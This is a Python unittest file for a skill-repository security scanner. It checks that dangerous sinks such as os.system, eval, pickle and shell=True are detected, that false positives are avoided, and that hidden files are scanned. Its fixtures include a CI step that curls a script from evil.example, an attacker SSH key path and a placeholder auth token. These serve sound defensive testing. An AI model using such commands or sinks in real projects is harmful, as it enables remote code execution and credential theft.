#!/usr/bin/env python3
"""Regression test for the blocking-interactive-input pattern check.

Run: python3 -m unittest skill-artisan/tests/test_security_scan.py -v
(or `python3 -m unittest discover -s skill-artisan/tests` from anywhere)

Found via the mattpocock/skills real-world audit pilot (2026-08-20, see
benchmark/audit-pilot/RESULTS.md): the `input(`-matching pattern flagged an
ordinary English comment ("Visible input (non-secret).") as a HIGH-severity
blocking-interactive-input finding, because `\\binput\\s*\\(` matches that
prose just as readily as a real Python `input(...)` call. Fixed by skipping
lines that are entirely a `#` comment for this check. This test guards two
things at once: the false positive is gone, and a real interactive-input
call (in code, not a comment) still gets caught.
"""
from __future__ import annotations

import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from _repo_paths import SCRIPTS_DIR  # noqa: E402

sys.path.insert(0, str(SCRIPTS_DIR))

import security_scan  # noqa: E402


def findings_for(filename: str, content: str) -> list[dict]:
    with tempfile.TemporaryDirectory() as tmp:
        skill_path = Path(tmp)
        (skill_path / filename).write_text(content)
        return security_scan.run_pattern_checks(skill_path)


class TestMarkdownCodeSpanExemption(unittest.TestCase):
    """Regression test for issue #20: a markdown doc *teaching* about a
    dangerous pattern or an absolute-path shape — inside a fenced block or
    an inline `code span` — isn't a live instance of it. Mirrors
    validate.py's check_path_references, which already strips exactly this
    for its own false-positive shape. Guards both directions: the
    documentation examples are no longer flagged, and the same patterns
    written outside backticks in a .md file still are.
    """

    def test_inline_code_span_dangerous_pattern_is_not_flagged(self):
        content = (
            "| Check | Pattern |\n"
            "|---|---|\n"
            "| Dangerous code patterns: `os.system(`, `pickle.load(` | HIGH |\n"
        )
        findings = findings_for("security-checklist.md", content)
        checks = [f["check"] for f in findings]
        self.assertNotIn("dangerous-code-pattern", checks)

    def test_inline_code_span_absolute_path_is_not_flagged(self):
        content = "Never `C:\\Users\\...` — paths break across platforms.\n"
        findings = findings_for("writing-philosophy.md", content)
        checks = [f["check"] for f in findings]
        self.assertNotIn("absolute-user-path", checks)

    def test_fenced_code_block_dangerous_pattern_is_not_flagged(self):
        content = (
            "Don't do this:\n"
            "```python\n"
            "os.system(user_input)\n"
            "```\n"
        )
        findings = findings_for("example.md", content)
        checks = [f["check"] for f in findings]
        self.assertNotIn("dangerous-code-pattern", checks)

    def test_real_dangerous_pattern_outside_code_span_still_flagged(self):
        content = "os.system(user_input)\n"
        findings = findings_for("notes.md", content)
        matches = [f for f in findings if f["check"] == "dangerous-code-pattern"]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0]["line"], 1)

    def test_real_absolute_path_outside_code_span_still_flagged(self):
        content = "Config lives at /home/attacker/.ssh/id_rsa on that box.\n"
        findings = findings_for("notes.md", content)
        matches = [f for f in findings if f["check"] == "absolute-user-path"]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0]["line"], 1)

    def test_dangerous_pattern_in_python_file_is_unaffected_by_backticks(self):
        # Backtick isn't valid Python 3 syntax; this only confirms non-.md
        # files never go through the markdown-code-span exemption.
        content = "os.system(f'`{user_input}`')\n"
        findings = findings_for("run.py", content)
        matches = [f for f in findings if f["check"] == "dangerous-code-pattern"]
        self.assertEqual(len(matches), 1)


class TestSelfScanExemption(unittest.TestCase):
    """Regression test: security_scan.py's own pattern-check
    definitions (DANGEROUS_CODE_PATTERNS, INTERACTIVE_INPUT_PATTERNS,
    HTTP_URL_PATTERN) contain, as literal regex source, the exact code
    shapes they're built to detect. Since security_scan.py ships inside
    creating-skills's scripts/, a normal audit of that skill scans this
    file against itself and matched those definitions as if they were live
    findings — not a hypothetical, reproduced directly against the real
    file. Fixed with self_scan_exempt_line_numbers(), the same
    marker-bracketed-range idea as docstring_line_numbers() above, scoped
    to files literally named security_scan.py so no other file's real
    os.system(/pickle.load(/read -p findings are affected.
    """

    def test_real_security_scan_source_has_no_self_matches(self):
        from _repo_paths import SCRIPTS_DIR as _SCRIPTS_DIR

        real_source = (_SCRIPTS_DIR / "security_scan.py").read_text()
        findings = findings_for("security_scan.py", real_source)
        self.assertEqual(findings, [])

    def test_same_pattern_in_a_differently_named_file_is_still_flagged(self):
        content = 'DANGEROUS = [(re.compile(r"os.system("), "desc")]\n'
        findings = findings_for("not_security_scan.py", content)
        checks = [f["check"] for f in findings]
        self.assertIn("dangerous-code-pattern", checks)

    def test_real_dangerous_pattern_in_security_scan_py_outside_exempt_range_is_still_flagged(self):
        content = (
            "# self-scan-exempt:start\n"
            "# self-scan-exempt:end\n"
            "os.system(user_input)\n"
        )
        findings = findings_for("security_scan.py", content)
        matches = [f for f in findings if f["check"] == "dangerous-code-pattern"]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0]["line"], 3)


class TestGithubUrlPrefixExemption(unittest.TestCase):
    """Regression test: pr_execute.py's normal
    `for prefix in ("git@github.com:", "https://github.com/", ...)`
    URL-prefix parsing loop (normalize_repo_slug) tripped the
    email-address and insecure-http-url heuristics on ordinary,
    non-sensitive example-format strings, not a real leaked credential or
    insecure endpoint.
    """

    def test_git_at_github_com_is_not_flagged_as_an_email(self):
        content = 'PREFIXES = ("git@github.com:", "https://github.com/")\n'
        findings = findings_for("pr_execute.py", content)
        checks = [f["check"] for f in findings]
        self.assertNotIn("email-address", checks)

    def test_http_github_com_is_not_flagged_as_an_insecure_url(self):
        content = 'fork_url = "http://github.com/owner/repo"\n'
        findings = findings_for("pr_execute.py", content)
        checks = [f["check"] for f in findings]
        self.assertNotIn("insecure-http-url", checks)

    def test_real_email_address_is_still_flagged(self):
        content = "Contact attacker@evil.example for access.\n"
        findings = findings_for("notes.md", content)
        checks = [f["check"] for f in findings]
        self.assertIn("email-address", checks)

    def test_real_insecure_http_url_is_still_flagged(self):
        content = "Fetch it from http://insecure-host.example/data\n"
        findings = findings_for("notes.md", content)
        checks = [f["check"] for f in findings]
        self.assertIn("insecure-http-url", checks)


class TestBlockingInteractiveInput(unittest.TestCase):
    def test_prose_mentioning_input_in_a_comment_is_not_flagged(self):
        content = (
            "#!/usr/bin/env bash\n"
            "# ask KEY \"Prompt\" — read a value into $KEY. Offers the existing .env\n"
            "# value as a default on re-runs (Enter keeps it). Visible input (non-secret).\n"
            "ask() { :; }\n"
        )
        findings = findings_for("template.sh", content)
        checks = [f["check"] for f in findings]
        self.assertNotIn("blocking-interactive-input", checks)

    def test_prose_mentioning_input_in_a_docstring_is_not_flagged(self):
        content = (
            "def apply_input_cell(ws, row, col, value):\n"
            '    """Style a cell as user input (blue font, green fill)."""\n'
            "    pass\n"
        )
        findings = findings_for("format_cell.py", content)
        checks = [f["check"] for f in findings]
        self.assertNotIn("blocking-interactive-input", checks)

    def test_real_python_input_call_is_still_flagged(self):
        content = "value = input('Enter your API key: ')\n"
        findings = findings_for("collect.py", content)
        matches = [f for f in findings if f["check"] == "blocking-interactive-input"]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0]["line"], 1)

    def test_real_bash_read_dash_p_is_still_flagged(self):
        content = "#!/usr/bin/env bash\nread -p 'Enter value: ' value\n"
        findings = findings_for("collect.sh", content)
        matches = [f for f in findings if f["check"] == "blocking-interactive-input"]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0]["line"], 2)


class TestDangerousSinkCoverage(unittest.TestCase):
    """The dangerous-sink list, and the whole-file matching it needs.

    Two gaps this covers. First, the checks used to run one physical line at
    a time, so any call a formatter had wrapped across lines matched nothing
    — `shell=True` on its own line was invisible. Second, the list only knew
    four shapes; the ordinary Python ways to execute a string or deserialize
    into live objects weren't checked at all.
    """

    def _details(self, filename: str, content: str) -> str:
        findings = findings_for(filename, content)
        return " | ".join(f["detail"] for f in findings if f["check"] == "dangerous-code-pattern")

    def test_multi_line_shell_true_is_caught(self):
        content = (
            "import subprocess\n"
            "subprocess.run(\n"
            "    cmd,\n"
            "    shell=True,\n"
            ")\n"
        )
        self.assertIn("shell=True", self._details("run.py", content))

    def test_single_line_shell_true_still_caught(self):
        self.assertIn("shell=True", self._details("run.py", "subprocess.run(cmd, shell=True)\n"))

    def test_shell_true_after_a_nested_call_is_caught(self):
        content = "subprocess.run(shlex.split(cmd), shell=True)\n"
        self.assertIn("shell=True", self._details("run.py", content))

    def test_multi_line_finding_reports_the_line_the_call_starts_on(self):
        content = "x = 1\nimport subprocess\nsubprocess.run(\n    cmd,\n    shell=True,\n)\n"
        findings = [f for f in findings_for("run.py", content) if f["check"] == "dangerous-code-pattern"]
        self.assertEqual([f["line"] for f in findings], [3])

    def test_eval_is_caught(self):
        self.assertIn("eval(", self._details("x.py", "result = eval(user_supplied)\n"))

    def test_exec_is_caught(self):
        self.assertIn("exec(", self._details("x.py", "exec(payload)\n"))

    def test_compile_is_caught(self):
        self.assertIn("compile(", self._details("x.py", "code = compile(src, '<s>', 'exec')\n"))

    def test_os_popen_is_caught(self):
        self.assertIn("os.popen(", self._details("x.py", "out = os.popen(cmd).read()\n"))

    def test_subprocess_getoutput_is_caught(self):
        self.assertIn("getoutput(", self._details("x.py", "out = subprocess.getoutput(cmd)\n"))

    def test_subprocess_getstatusoutput_is_caught(self):
        self.assertIn("getoutput(", self._details("x.py", "rc, out = subprocess.getstatusoutput(cmd)\n"))

    def test_yaml_load_without_safe_loader_is_caught(self):
        self.assertIn("SafeLoader", self._details("x.py", "cfg = yaml.load(stream)\n"))

    def test_yaml_load_with_safe_loader_is_not_flagged(self):
        self.assertEqual("", self._details("x.py", "cfg = yaml.load(stream, Loader=yaml.SafeLoader)\n"))

    def test_yaml_safe_load_is_not_flagged(self):
        self.assertEqual("", self._details("x.py", "cfg = yaml.safe_load(stream)\n"))

    def test_js_yaml_load_is_not_flagged(self):
        # js-yaml's `load` has been the safe one since its 4.0 — the same
        # spelling means the opposite thing outside Python.
        self.assertEqual("", self._details("parser.js", "const fm = yaml.load(text);\n"))

    def test_marshal_loads_is_caught(self):
        self.assertIn("marshal", self._details("x.py", "obj = marshal.loads(blob)\n"))

    def test_import_marshal_is_caught(self):
        self.assertIn("marshal", self._details("x.py", "import marshal\n"))

    def test_dunder_import_is_caught(self):
        self.assertIn("__import__(", self._details("x.py", "mod = __import__(name)\n"))

    def test_pickle_loads_is_caught(self):
        self.assertIn("pickle", self._details("x.py", "obj = pickle.loads(blob)\n"))

    def test_attribute_access_is_not_mistaken_for_a_builtin(self):
        # The single biggest false-positive risk in adding bare-name checks:
        # `re.compile(` is on nearly every line of this project's own
        # scanner, and `.eval(`/`.exec(` are ordinary method names.
        content = (
            "import re\n"
            "PATTERN = re.compile(r'x')\n"
            "session.exec(stmt)\n"
            "model.eval()\n"
            "df.eval('a + b')\n"
            "cursor.execute(sql)\n"
        )
        self.assertEqual("", self._details("x.py", content))

    def test_identifiers_merely_containing_a_sink_name_are_not_flagged(self):
        content = "eval_loop = 1\nevaluate(x)\nprecompile_all()\nmy_eval(1)\n"
        self.assertEqual("", self._details("x.py", content))

    def test_markdown_code_span_exemption_still_holds_for_the_new_sinks(self):
        content = "Avoid `eval(`, `exec(` and `marshal.loads(` in bundled scripts.\n"
        self.assertEqual("", self._details("security-checklist.md", content))

    def test_markdown_fenced_block_exemption_still_holds_for_the_new_sinks(self):
        content = "Bad:\n\n```python\nresult = eval(user_supplied)\n```\n"
        self.assertEqual("", self._details("guide.md", content))

    def test_the_same_sink_outside_backticks_in_markdown_is_still_flagged(self):
        content = "Then call eval(payload) to run it.\n"
        self.assertIn("eval(", self._details("guide.md", content))


class TestSelfScanExemptionAfterSinkExpansion(unittest.TestCase):
    """The scanner's own pattern definitions contain, as literal source, the
    shapes they detect. That exemption has to keep working now that the
    definitions have grown — and the expanded sink list must not start
    flagging this repo's own scripts.

    Distinct from TestSelfScanExemption above, which guards the original
    mechanism; this covers the enlarged pattern set specifically.
    """

    def test_scanning_the_scripts_directory_reports_no_dangerous_patterns(self):
        findings = security_scan.run_pattern_checks(SCRIPTS_DIR)
        offenders = [
            f for f in findings
            if f["check"] == "dangerous-code-pattern" and f["file"] == "security_scan.py"
        ]
        self.assertEqual(offenders, [], f"self-scan exemption regressed: {offenders}")

    def test_the_exempt_range_is_still_located(self):
        text = (SCRIPTS_DIR / "security_scan.py").read_text()
        self.assertTrue(security_scan.self_scan_exempt_line_numbers(text))

    def test_the_repos_own_scripts_produce_no_high_severity_findings(self):
        # The real no-false-positive check: every bundled script in this
        # repo, scanned with the live pattern set.
        findings = security_scan.run_pattern_checks(SCRIPTS_DIR)
        high = [f for f in findings if f["severity"] == "HIGH"]
        self.assertEqual(high, [], f"new false positives on this repo's own scripts: {high}")


class TestHiddenFilesAreScanned(unittest.TestCase):
    """Hidden files used to be invisible to every consumer of
    iter_scannable_files. That made the pattern checks unable to see `.env`,
    `.npmrc` or `.github/workflows/*`, and — worse — made the tamper marker
    structurally blind to a whole class of change: a hidden file could be
    added or edited after a clean scan and the marker still verified.
    """

    def _tree(self, tmp: Path) -> Path:
        skill = tmp / "a-skill"
        (skill / ".github" / "workflows").mkdir(parents=True)
        (skill / "SKILL.md").write_text("---\nname: a-skill\ndescription: d\n---\n\nBody\n")
        return skill

    def test_dotfile_contents_are_pattern_checked(self):
        with tempfile.TemporaryDirectory() as tmp:
            skill = self._tree(Path(tmp))
            (skill / ".env").write_text("HOME_DIR=/home/someone/secrets\n")
            findings = security_scan.run_pattern_checks(skill)
        self.assertIn(".env", [f["file"] for f in findings])

    def test_hidden_directory_contents_are_pattern_checked(self):
        with tempfile.TemporaryDirectory() as tmp:
            skill = self._tree(Path(tmp))
            wf = skill / ".github" / "workflows" / "ci.yml"
            wf.write_text("jobs:\n  x:\n    steps:\n      - run: curl http://evil.example/p.sh\n")
            findings = security_scan.run_pattern_checks(skill)
        self.assertIn(".github/workflows/ci.yml", [f["file"].replace("\\", "/") for f in findings])

    def test_git_directory_stays_excluded(self):
        with tempfile.TemporaryDirectory() as tmp:
            skill = self._tree(Path(tmp))
            (skill / ".git").mkdir()
            (skill / ".git" / "config").write_text("url = /home/someone/repo\n")
            files = [rel.as_posix() for _, rel in
                     security_scan.iter_scannable_files(skill, [], include_hidden=True)]
        self.assertNotIn(".git/config", files)

    def test_skillignore_still_applies_to_hidden_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            skill = self._tree(Path(tmp))
            (skill / ".skillignore").write_text(".env\n")
            (skill / ".env").write_text("SECRET=x\n")
            files = [rel.as_posix() for _, rel in
                     security_scan.iter_scannable_files(skill, security_scan.load_skillignore(skill),
                                                        include_hidden=True)]
        self.assertNotIn(".env", files)

    def test_packaging_still_excludes_hidden_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            skill = self._tree(Path(tmp))
            (skill / ".env").write_text("SECRET=x\n")
            files = [rel.as_posix() for _, rel in security_scan.iter_scannable_files(skill, [])]
        self.assertEqual(files, ["SKILL.md"])

    def test_marker_goes_stale_when_a_hidden_file_is_modified(self):
        with tempfile.TemporaryDirectory() as tmp:
            skill = self._tree(Path(tmp))
            (skill / ".env").write_text("SECRET=original\n")

            security_scan.write_marker(skill, security_scan.compute_content_hash(skill))
            valid, _ = security_scan.verify_marker(skill)
            self.assertTrue(valid, "a freshly written marker must verify")

            (skill / ".env").write_text("SECRET=tampered\n")
            valid, reason = security_scan.verify_marker(skill)
        self.assertFalse(valid, "editing a hidden file must invalidate the marker")
        self.assertIn("changed", reason)

    def test_marker_goes_stale_when_a_hidden_file_is_added(self):
        with tempfile.TemporaryDirectory() as tmp:
            skill = self._tree(Path(tmp))
            security_scan.write_marker(skill, security_scan.compute_content_hash(skill))
            self.assertTrue(security_scan.verify_marker(skill)[0])

            (skill / ".npmrc").write_text("//registry.example/:_authToken=abc\n")
            valid, _ = security_scan.verify_marker(skill)
        self.assertFalse(valid, "adding a hidden file must invalidate the marker")

    def test_marker_goes_stale_when_a_file_in_a_hidden_directory_changes(self):
        with tempfile.TemporaryDirectory() as tmp:
            skill = self._tree(Path(tmp))
            wf = skill / ".github" / "workflows" / "ci.yml"
            wf.write_text("jobs: {}\n")
            security_scan.write_marker(skill, security_scan.compute_content_hash(skill))
            self.assertTrue(security_scan.verify_marker(skill)[0])

            wf.write_text("jobs:\n  x:\n    steps:\n      - run: exfiltrate\n")
            valid, _ = security_scan.verify_marker(skill)
        self.assertFalse(valid)

    def test_the_marker_itself_is_never_part_of_its_own_hash(self):
        # Otherwise writing the marker would immediately invalidate it.
        with tempfile.TemporaryDirectory() as tmp:
            skill = self._tree(Path(tmp))
            before = security_scan.compute_content_hash(skill)
            security_scan.write_marker(skill, before)
            after = security_scan.compute_content_hash(skill)
        self.assertEqual(before, after)
        self.assertTrue(security_scan.is_marker_file(Path(security_scan.MARKER_FILENAME)))


if __name__ == "__main__":
    unittest.main()
